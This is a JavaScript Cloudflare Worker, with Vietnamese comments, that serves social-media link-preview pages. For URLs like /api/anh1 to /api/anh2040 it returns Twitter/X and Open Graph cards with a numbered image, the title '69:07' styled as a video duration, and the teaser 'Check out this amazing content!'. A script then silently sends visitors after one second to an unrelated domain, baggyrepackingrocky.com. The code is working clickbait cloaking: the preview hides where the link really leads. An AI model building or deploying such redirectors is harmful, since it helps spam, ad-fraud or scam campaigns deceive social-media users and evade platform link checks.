export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Nếu không phải /api/... thì lấy file từ thư mục public
    if (!url.pathname.startsWith("/api/")) {
      return env.ASSETS.fetch(request);
    }

    // Ví dụ:
    // /api/anh1 -> 1
    // /api/anh3 -> 3
    // /api/anh100 -> 100
    const match = url.pathname.match(/^\/api\/anh(\d+)$/);

    if (!match) {
      return new Response("Not found", {
        status: 404
      });
    }

    let imageNumber = Number(match[1]);

    // Chỉ cho phép anh1 -> anh2040
    if (imageNumber < 1 || imageNumber > 2040) {
      imageNumber = 3;
    }

    // Link chuyển hướng sau 1 giây
    const redirectUrl =
      "https://baggyrepackingrocky.com/2022576";

    // public/3.png -> https://vidiy.fit/3.png
    const imageUrl =
      `${url.origin}/${imageNumber}.png`;

    const title = "69:07";
    const description =
      "Check out this amazing content!";

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">

  <title>${title}</title>

  <!-- Twitter / X Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${title}">
  <meta name="twitter:description" content="${description}">
  <meta name="twitter:image" content="${imageUrl}">
  <meta name="twitter:url" content="${url.href}">

  <!-- Open Graph -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="${title}">
  <meta property="og:description" content="${description}">
  <meta property="og:image" content="${imageUrl}">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="${url.href}">
</head>

<body>

<script>
  setTimeout(function() {
    window.location.href =
      ${JSON.stringify(redirectUrl)};
  }, 1000);
</script>

</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=UTF-8",
        "Cache-Control": "no-store"
      }
    });
  }
};
